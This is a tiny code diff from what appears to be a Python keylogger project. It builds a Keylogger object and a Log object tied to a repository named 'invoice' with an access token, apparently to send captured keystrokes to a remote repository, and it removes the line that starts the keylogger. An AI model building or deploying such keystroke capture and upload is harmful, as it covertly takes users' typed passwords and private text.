@@ -39,4 +39,3 @@ repository_name = 'invoice'
 access_token = ''  
 keylogger = Keylogger("Keylogger")
 file_creator = Log(repository_owner, repository_name, access_token)
-keylogger.Run_Keylogger()
